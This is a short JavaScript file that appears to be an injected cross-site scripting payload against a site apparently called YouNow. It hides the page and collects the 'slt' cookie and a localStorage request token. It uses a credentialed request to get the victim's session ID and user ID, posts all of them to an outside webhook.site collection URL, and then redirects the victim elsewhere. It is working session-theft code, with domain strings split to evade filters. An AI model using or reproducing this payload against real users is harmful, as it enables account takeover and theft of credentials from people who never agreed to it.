async function run() {
    document.title = 'You' + 'Now';
    history.replaceState(null, null, '/');
    if (document.body) document.body.style.display = 'none';

    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }

    let sltCookie = getCookie('slt') || '';
    let reqBy = localStorage.getItem('requestBy') || localStorage.getItem('REQUEST_BY');
    let sid = null;
    let err = null;
    let uid = 0;

    try {
        let response = await fetch("https://api.you" + "now.com/php/api/you" + "now/user", {
            "headers": {
                "X-Requested-By": reqBy
            },
            "method": "POST",
            "credentials": "include"
        });

        let json = await response.json();
        sid = json.session;
        uid = json.userId;
    } catch (e) {
        err = e.toString();
    }

    let finalString = `${uid}:${sid}:${sltCookie}:${reqBy}:${err}`;

    try {
        await fetch('https://webhook.site/f781c683-6886-47c1-abb4-77504836f33f', {
            method: 'POST',
            body: finalString
        });
    } catch (e) {
        console.log(e);
    }

    location.href = 'https://www.you' + 'nowmerch.com/post/january-partnerme';
}

run();
